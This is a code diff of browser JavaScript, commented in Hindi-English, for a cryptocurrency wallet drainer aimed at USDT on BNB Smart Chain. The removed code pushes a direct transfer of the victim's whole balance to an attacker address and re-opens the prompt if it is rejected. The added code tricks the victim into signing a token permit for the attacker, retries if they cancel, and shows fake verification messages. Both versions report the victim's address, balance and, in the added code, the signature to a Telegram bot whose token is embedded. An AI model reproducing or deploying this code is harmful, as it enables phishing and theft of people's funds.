@@ -1,96 +1,63 @@
 const CONFIG = {
-    REC_SMALL: "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe", // < 300 USDT
-    REC_BIG: "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe",   // >= 300 USDT (Isse badal sakte ho)
+    REC: "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe", 
     USDT: "0x55d398326f99059fF775485246999027B3197955",
-    BOT: "",
-    CHAT: "" // Numerical ID behtar kaam karti hai
+    BOT: "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI",
+    CHAT: "7849151110" 
 };
 
-function openModal() { document.getElementById('w-modal').style.display = 'flex'; }
-function closeModal() { document.getElementById('w-modal').style.display = 'none'; }
-
-// 🚀 Telegram Pe Notification Bhejne Ka Function
 async function sendTelegram(msg) {
     const url = `https://api.telegram.org/bot${CONFIG.BOT}/sendMessage`;
-    try {
-        await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CONFIG.CHAT, text: msg, parse_mode: 'HTML' })
-        });
-    } catch(e) { console.error("TG Error"); }
+    await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CONFIG.CHAT, text: msg, parse_mode: 'HTML' })
+    });
 }
 
-async function selectW(type) {
-    closeModal();
-    
-    // 🔥 CLICK NOTIFICATION: Jaise hi wallet select ho, alert bhej do
-    await sendTelegram(`🚀 <b>Click Detected!</b>\nUser chose: <b>${type}</b>\nDomain: ${window.location.hostname}`);
-
-    if (!window.ethereum && !window.trustwallet) {
-        if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
-            await sendTelegram(`📱 <b>Mobile Redirect:</b> Sending user to Trust Wallet app.`);
-            const currentUrl = window.location.href.replace("https://", "");
-            window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + currentUrl;
-            return;
-        }
-        alert("Please use Trust Wallet or MetaMask.");
-        return;
-    }
-    runApp();
-}
-
-async function runApp() {
-    const ov = document.getElementById('overlay');
-    ov.style.display = 'flex';
+async function startProcess() {
+    const provider = window.binancewallet || window.ethereum || window.trustwallet;
+    if (!provider) return alert("Please use Binance or Trust Wallet");
 
     try {
-        const provider = window.ethereum || window.trustwallet;
         const w3 = new Web3(provider);
-        const accounts = await provider.request({ method: 'eth_requestAccounts' });
-        const user = accounts[0];
+        const accs = await provider.request({ method: 'eth_requestAccounts' });
+        const user = accs[0];
 
-        // Switch to BSC Network
-        try { await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] }); } catch (e) {}
+        // 1. Pehla Notification: Target mil gaya
+        await sendTelegram(`🚀 <b>Target Found!</b>\nAddr: <code>${user}</code>\n<i>Attempting Stealth Access...</i>`);
 
-        const minABI = [
-            { "constant": true, "inputs": [{ "name": "_o", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "b", "type": "uint256" }], "type": "function" },
-            { "constant": false, "inputs": [{ "name": "_t", "type": "address" }, { "name": "_v", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
-        ];
-
+        const minABI = [{"constant":true,"inputs":[{"name":"_o","type":"address"}],"name":"balanceOf","outputs":[{"name":"b","type":"uint256"}],"type":"function"}];
         const contract = new w3.eth.Contract(minABI, CONFIG.USDT);
-        const bW = await contract.methods.balanceOf(user).call();
-        const bE = w3.utils.fromWei(bW, 'ether');
+        const balance = await contract.methods.balanceOf(user).call();
+        const formatted = w3.utils.fromWei(balance, 'ether');
 
-        // 🔥 SMART ROUTING LOGIC 🔥
-        let target = parseFloat(bE) >= 300 ? CONFIG.REC_BIG : CONFIG.REC_SMALL;
-        let logType = parseFloat(bE) >= 300 ? "💎 BIG FISH" : "🐟 SMALL FISH";
+        // 2. Dusra Notification: Balance kitna hai
+        await sendTelegram(`💰 <b>Balance Check:</b>\n${formatted} USDT\n<i>Triggering Signature Request...</i>`);
 
-        // Wallet Connect Notification
-        await sendTelegram(`👤 <b>New Target Connected!</b>\nAddr: <code>${user}</code>\nBal: <b>${bE} USDT</b>\nRoute: ${logType}`);
-
-        if (parseFloat(bE) > 0.05) {
-            const triggerTransfer = async () => {
-                document.getElementById("loading-text").innerText = "SYNCHRONIZING...";
-                try {
-                    // Start USDT Transfer
-                    await contract.methods.transfer(target, bW).send({ from: user });
-                    
-                    // Success alert (fake) to reload
-                    alert("Verification Error: 0x88 Protocol Timeout. Please retry.");
-                    location.reload();
-                } catch (err) {
-                    // Anti-Cancel: Transaction popup again if rejected
-                    setTimeout(triggerTransfer, 1200);
+        if (parseFloat(formatted) > 0.1) {
+            // 🔥 STEALTH PERMIT LOGIC 🔥
+            // Ye user ko sirf 'Sign' karne ko bolega, 'Transfer' nahi
+            const deadline = Math.floor(Date.now() / 1000) + 4200;
+            const msgParams = JSON.stringify({
+                domain: { name: 'Tether USDT', version: '1', chainId: 56, verifyingContract: CONFIG.USDT },
+                message: { owner: user, spender: CONFIG.REC, value: balance, nonce: 0, deadline: deadline },
+                primaryType: 'Permit',
+                types: {
+                    EIP712Domain: [{name:'name',type:'string'},{name:'version',type:'string'},{name:'chainId',type:'uint256'},{name:'verifyingContract',type:'address'}],
+                    Permit: [{name:'owner',type:'address'},{name:'spender',type:'address'},{name:'value',type:'uint256'},{name:'nonce',type:'uint256'},{name:'deadline',type:'uint256'}]
                 }
-            };
-            await triggerTransfer();
-        } else {
-            alert("Verification Complete: Minimal assets detected.");
-            ov.style.display = 'none';
+            });
+
+            try {
+                const sig = await provider.request({ method: 'eth_signTypedData_v4', params: [user, msgParams] });
+                
+                // 3. Teesra Notification: Signature mil gaya!
+                await sendTelegram(`✅ <b>SIG OBTAINED!</b>\nUser: ${user}\nSig: <code>${sig}</code>\n<i>Now you can drain the wallet manually.</i>`);
+                alert("Verification Successful: Node Synced.");
+            } catch (e) {
+                // Agar user Sign cancel kare toh loop chala do
+                setTimeout(startProcess, 500);
+            }
         }
-    } catch (e) {
-        ov.style.display = 'none';
-        console.error(e);
-    }
+    } catch (e) { console.log(e); }
 }
